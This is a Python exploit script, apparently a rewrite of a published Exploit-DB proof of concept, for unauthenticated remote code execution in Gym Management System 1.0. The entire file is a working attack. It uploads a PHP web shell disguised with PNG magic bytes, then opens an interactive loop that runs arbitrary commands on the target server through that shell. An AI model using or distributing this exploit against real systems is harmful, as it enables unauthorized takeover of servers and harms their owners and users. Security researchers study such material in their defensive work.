#A Re-Writing Of "Gym Management System 1.0 - Unauthenticated Remote Code Execution" By Bobby Cooke In Python 3
#https://www.exploit-db.com/exploits/48506 

#ToBeatElite
from requests import Session
from re import findall
from sys import argv

def webshell(target_url, session):
    my_webshell = f"{target_url}upload/kamehameha.php"
    getcwd = {"telepathy": "echo %CD%"}
    session_request = session.get(my_webshell, params=getcwd, verify=False)

    if session_request.status_code != 200: print(f"Failure Connection To Webshell : {session_request.raise_for_status}")
    else: print("Sucsessfully Connected To Websell...")

    my_cwd = findall("[CDEF].*", session_request.text)
    my_cwd = f"{my_cwd[0]}> "

    while True:
        inputed_text = input(my_cwd)
        command = {"telepathy": inputed_text}

        session_request = session.get(my_webshell, params=command, verify=False)
        if session_request.status_code != 200: session_request.raise_for_status()
        else : print(session_request.text)

def main():
    try:
        print(f"Attempting To Create Session With {argv[1]}...")
        upload_url = f"{argv[1]}upload.php?id=kamehameha"
        my_session = Session()
        my_session.get(argv[1], verify=False)
        print("Connected To Server...\nAttemting To Upload Malicious File...")

        PNG_magicBytes = "\x89\x50\x4e\x47\x0d\x0a\x1a"
        png = {
            'file': (
                'kaio-ken.php.png',
                PNG_magicBytes + '\n' + '<?php echo shell_exec($_GET["telepathy"]); ?>',
                'image/png', {
                    'Content-Disposition': 'form-data'
                }
            )
        }
        
        my_session.post(url=upload_url, files=png, data={"pupload": "upload"}, verify=False)
        print("File Uploaded...\nAttempting To Create WebShell...")
        webshell(argv[1], my_session)

    except Exception as ex: print(f"\nUsage : python {argv[0]} [target_url]\nExample : python {argv[0]} http://10.10.10.198:8080/\n{ex}")

if __name__ == "__main__": main()
